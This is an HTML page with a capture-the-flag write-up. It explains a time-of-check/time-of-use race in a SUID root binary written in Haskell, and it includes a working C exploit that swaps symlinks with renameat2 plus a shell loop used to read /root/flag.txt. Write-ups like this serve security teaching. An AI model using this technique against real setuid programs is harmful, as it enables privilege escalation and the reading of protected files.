@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+
+<html>
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<meta content="KxBie6T6uw1Iexm0-tldr4zEIM4zAUdDLF9N_t97cIE" name="google-site-verification"/>
+<meta content="CTF writeups made by LUHack members." name="description">
+<meta content="PwnEd: PreCTF part 5" property="og:title"/>
+<meta content="website" property="og:type"/>
+<meta content="../../static/images/logo_small.png" property="og:image"/>
+<meta content="" property="og:url"/>
+<meta content="LUHack" property="og:site_name"/>
+<meta content="CTF writeups made by LUHack members." property="og:description"/>
+<link href="../../static/images/apple-touch-icon-57x57.png" rel="apple-touch-icon-precomposed" sizes="57x57"/>
+<link href="../../static/images/apple-touch-icon-114x114.png" rel="apple-touch-icon-precomposed" sizes="114x114">
+<link href="../../static/images/apple-touch-icon-72x72.png" rel="apple-touch-icon-precomposed" sizes="72x72"/>
+<link href="../../static/images/apple-touch-icon-144x144.png" rel="apple-touch-icon-precomposed" sizes="144x144"/>
+<link href="../../static/images/apple-touch-icon-60x60.png" rel="apple-touch-icon-precomposed" sizes="60x60"/>
+<link href="../../static/images/apple-touch-icon-120x120.png" rel="apple-touch-icon-precomposed" sizes="120x120"/>
+<link href="../../static/images/apple-touch-icon-76x76.png" rel="apple-touch-icon-precomposed" sizes="76x76"/>
+<link href="../../static/images/apple-touch-icon-152x152.png" rel="apple-touch-icon-precomposed" sizes="152x152"/>
+<link href="../../static/images/favicon-196x196.png" rel="icon" sizes="196x196" type="image/png"/>
+<link href="../../static/images/favicon-96x96.png" rel="icon" sizes="96x96" type="image/png"/>
+<link href="../../static/images/favicon-32x32.png" rel="icon" sizes="32x32" type="image/png"/>
+<link href="../../static/images/favicon-16x16.png" rel="icon" sizes="16x16" type="image/png"/>
+<link href="../../static/images/favicon-128.png" rel="icon" sizes="128x128" type="image/png"/>
+<meta content="LUHack" name="application-name"/>
+<meta content="#FFFFFF" name="msapplication-TileColor"/>
+<meta content="../../static/images/mstile-144x144.png" name="msapplication-TileImage"/>
+<meta content="../../static/images/mstile-70x70.png" name="msapplication-square70x70logo"/>
+<meta content="../../static/images/mstile-150x150.png" name="msapplication-square150x150logo"/>
+<meta content="../../static/images/mstile-310x150.png" name="msapplication-wide310x150logo"/>
+<meta content="../../static/images/mstile-310x310.png" name="msapplication-square310x310logo"/>
+<script type="application/ld+json">
+     {
+         "@context": "https://schema.org",
+         "@type": "Article",
+         "author": "simmsb",
+         "name": "PwnEd: PreCTF part 5",
+         "about": "Cyber Security",
+         "url": "",
+         "datePublished": "2021-02-28T18:26:39.330704",
+         "dateModified": "2021-02-28T18:26:39.330704",
+         "publsher": {
+             "@type": "Organization",
+             "name": "LUHack"
+         }
+     }
+    </script>
+<title>LUHack Writeup: PwnEd: PreCTF part 5</title>
+<link href="../../_assets/cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/fontawesome.min.css" referrerpolicy="no-referrer" rel="stylesheet"/>
+<link href="../../_assets/cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/solid.min.css" referrerpolicy="no-referrer" rel="stylesheet"/>
+<link href="../../_assets/cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/brands.min.css" referrerpolicy="no-referrer" rel="stylesheet"/>
+<link href="../../_assets/unpkg.com/purecss%402.0.3/build/pure-min.css" rel="stylesheet"/>
+<link href="../../_assets/fonts.googleapis.com/css_81f601ca.css" rel="stylesheet"/>
+<link href="../../static/css/main.css" rel="stylesheet"/>
+<link href="../../static/css/highlight.min.css" rel="stylesheet"/>
+<script defer="" src="../../static/js/base.js"></script>
+</link></meta></head>
+<body>
+<div class="with-sidebar">
+<div class="fill-height">
+<div class="sidebar" id="menu">
+<div class="header">
+<h1 class="brand-title">
+<a class="logo" href="../../index.html">
+<img alt="LUHack logo" src="../../static/images/luhack_logo.png" width="100%"/>
+</a>
+</h1>
+<nav class="nav">
+<ul class="nav-list">
+<li class="nav-item">
+<a class="button" href="../../index.html">Home</a>
+</li>
+<li class="nav-item">
+<a class="button" href="../index.html">Writeups</a>
+</li>
+<li class="nav-item">
+<a class="button" href="../../challenges/index.html">Challenges</a>
+</li>
+<br/>
+<li class="nav-item">
+<a class="button" href="../tags.html">Tag List</a>
+</li>
+<li class="nav-item">
+<a class="button" href="../new.html">New Writeup</a>
+</li>
+</ul>
+</nav>
+<br/>
+<form action="../index.html" class="pure-form" method="GET">
+<input autocomplete="off" class="search-bar" id="search-bar" name="search" placeholder="Search writeups" type="search" value=""/>
+</form>
+<div class="header-content">
+<div class="article-meta">
+<h2>PwnEd: PreCTF part 5</h2>
+<h4 class="author">By: <a href="../user/simmsb.html">simmsb</a></h4>
+<h4 class="date">2021-02-28 18:26:39.330704</h4>
+<div class="tags">
+<a class="post-category" href="../tag/pwned.html">pwned</a>
+</div>
+</div>
+</div>
+</div>
+<div class="footer">
+<div class="legal">
+<div class="">
+<a href="#" title="Sign In">Sign In</a>
+</div>
+</div>
+</div>
+</div>
+<div class="not-sidebar">
+<main>
+<h1>PreCTF part 5</h1>
+<p>Once we have access to the webserver, we find a SUID binary owned by root and the source code:</p>
+<div class="highlight"><pre><span></span><span class="kr">module</span><span class="w"> </span><span class="nn">Main</span><span class="w"> </span><span class="kr">where</span><span class="w"></span>
+
+<span class="kr">import</span><span class="w"> </span><span class="nn">System.Environment</span><span class="w"> </span><span class="p">(</span><span class="nf">getArgs</span><span class="p">)</span><span class="w"></span>
+<span class="kr">import</span><span class="w"> </span><span class="nn">System.Posix.Types</span><span class="w"> </span><span class="p">(</span><span class="kt">FileMode</span><span class="p">)</span><span class="w"></span>
+<span class="kr">import</span><span class="w"> </span><span class="nn">System.Posix.Files</span><span class="w"></span>
+<span class="kr">import</span><span class="w"> </span><span class="nn">System.IO</span><span class="w"></span>
+
+
+<span class="nf">hasMode</span><span class="w"> </span><span class="ow">::</span><span class="w"> </span><span class="kt">FileMode</span><span class="w"> </span><span class="ow">-&gt;</span><span class="w"> </span><span class="kt">FileMode</span><span class="w"> </span><span class="ow">-&gt;</span><span class="w"> </span><span class="kt">Bool</span><span class="w"></span>
+<span class="nf">hasMode</span><span class="w"> </span><span class="n">f1</span><span class="w"> </span><span class="n">f2</span><span class="w"> </span><span class="ow">=</span><span class="w"> </span><span class="n">intersectFileModes</span><span class="w"> </span><span class="n">f1</span><span class="w"> </span><span class="n">f2</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">f1</span><span class="w"></span>
+
+<span class="nf">verifyStat</span><span class="w"> </span><span class="ow">::</span><span class="w"> </span><span class="kt">FileStatus</span><span class="w"> </span><span class="ow">-&gt;</span><span class="w"> </span><span class="kt">Bool</span><span class="w"></span>
+<span class="nf">verifyStat</span><span class="w"> </span><span class="n">fs</span><span class="w"> </span><span class="ow">=</span><span class="w"> </span><span class="n">notRootUID</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">notRootGID</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">hasMode</span><span class="w"> </span><span class="n">ownerReadMode</span><span class="w"> </span><span class="n">fMode</span><span class="w"></span>
+<span class="w">    </span><span class="kr">where</span><span class="w"></span>
+<span class="w">        </span><span class="n">notRootUID</span><span class="w"> </span><span class="ow">=</span><span class="w"> </span><span class="n">fileOwner</span><span class="w"> </span><span class="n">fs</span><span class="w"> </span><span class="o">/=</span><span class="w"> </span><span class="mi">0</span><span class="w"></span>
+<span class="w">        </span><span class="n">notRootGID</span><span class="w"> </span><span class="ow">=</span><span class="w"> </span><span class="n">fileGroup</span><span class="w"> </span><span class="n">fs</span><span class="w"> </span><span class="o">/=</span><span class="w"> </span><span class="mi">0</span><span class="w"></span>
+<span class="w">        </span><span class="n">fMode</span><span class="w"> </span><span class="ow">=</span><span class="w"> </span><span class="n">fileMode</span><span class="w"> </span><span class="n">fs</span><span class="w"></span>
+
+
+<span class="nf">main</span><span class="w"> </span><span class="ow">::</span><span class="w"> </span><span class="kt">IO</span><span class="w"> </span><span class="nb">()</span><span class="w"></span>
+<span class="nf">main</span><span class="w"> </span><span class="ow">=</span><span class="w"> </span><span class="kr">do</span><span class="w"></span>
+<span class="w">    </span><span class="n">file</span><span class="w"> </span><span class="ow">&lt;-</span><span class="w"> </span><span class="n">head</span><span class="w"> </span><span class="o">&lt;$&gt;</span><span class="w"> </span><span class="n">getArgs</span><span class="w"></span>
+<span class="w">    </span><span class="n">stat</span><span class="w"> </span><span class="ow">&lt;-</span><span class="w"> </span><span class="n">getFileStatus</span><span class="w"> </span><span class="n">file</span><span class="w"></span>
+<span class="w">    </span><span class="kr">if</span><span class="w"> </span><span class="n">verifyStat</span><span class="w"> </span><span class="n">stat</span><span class="w"> </span><span class="kr">then</span><span class="w"></span>
+<span class="w">        </span><span class="n">readFile</span><span class="w"> </span><span class="n">file</span><span class="w"> </span><span class="o">&gt;&gt;=</span><span class="w"> </span><span class="n">putStrLn</span><span class="w"></span>
+<span class="w">    </span><span class="kr">else</span><span class="w"></span>
+<span class="w">        </span><span class="n">hPutStrLn</span><span class="w"> </span><span class="n">stderr</span><span class="w"> </span><span class="s">"Not allowed!"</span><span class="w"></span>
+</pre></div>
+<p>This is a classic TOC/TOU vulnerability, if we pass it a symlink we can change what the symlink points to after the program checks file access, but before reading the file, we can have it read any file. 
+So with a simple program that rapidly exchanges two symlinks:</p>
+<div class="highlight"><pre><span></span><span class="cp">#define _GNU_SOURCE</span>
+
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;fcntl.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sched.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp"></span>
+
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="n">close</span><span class="p">(</span><span class="n">open</span><span class="p">(</span><span class="s">"/var/www/html/lol"</span><span class="p">,</span><span class="w"> </span><span class="n">O_RDWR</span><span class="o">|</span><span class="n">O_CREAT</span><span class="p">,</span><span class="w"> </span><span class="mo">0777</span><span class="p">));</span><span class="w"></span>
+<span class="w">  </span><span class="n">symlink</span><span class="p">(</span><span class="s">"/var/www/html/lol"</span><span class="p">,</span><span class="w"> </span><span class="s">"/var/www/html/sym"</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">symlink</span><span class="p">(</span><span class="s">"/root/flag.txt"</span><span class="p">,</span><span class="w"> </span><span class="s">"/var/www/html/sym_target"</span><span class="p">);</span><span class="w"></span>
+
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">open</span><span class="p">(</span><span class="s">"/var/www/html"</span><span class="p">,</span><span class="w"> </span><span class="n">O_DIRECTORY</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">O_RDONLY</span><span class="p">);</span><span class="w"></span>
+
+<span class="w">  </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="n">renameat2</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="s">"/var/www/html/sym_target"</span><span class="p">,</span><span class="w"> </span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="s">"/var/www/html/sym"</span><span class="p">,</span><span class="w"> </span><span class="n">RENAME_EXCHANGE</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="n">sched_yield</span><span class="p">();</span><span class="w"></span>
+<span class="w">    </span><span class="n">renameat2</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="s">"/var/www/html/sym"</span><span class="p">,</span><span class="w"> </span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="s">"/var/www/html/sym_target"</span><span class="p">,</span><span class="w"> </span><span class="n">RENAME_EXCHANGE</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="p">}</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</pre></div>
+<p>Then, while running this program at the same time as spamming the SUID program:</p>
+<div class="highlight"><pre><span></span><span class="k">while</span> true<span class="p">;</span> <span class="k">do</span> ./gamestonks /var/www/html/sym<span class="p">;</span> <span class="k">done</span>
+</pre></div>
+<p>The flag is eventually printed.</p>
+</main>
+</div>
+</div>
+</div>
+</body>
+</html>
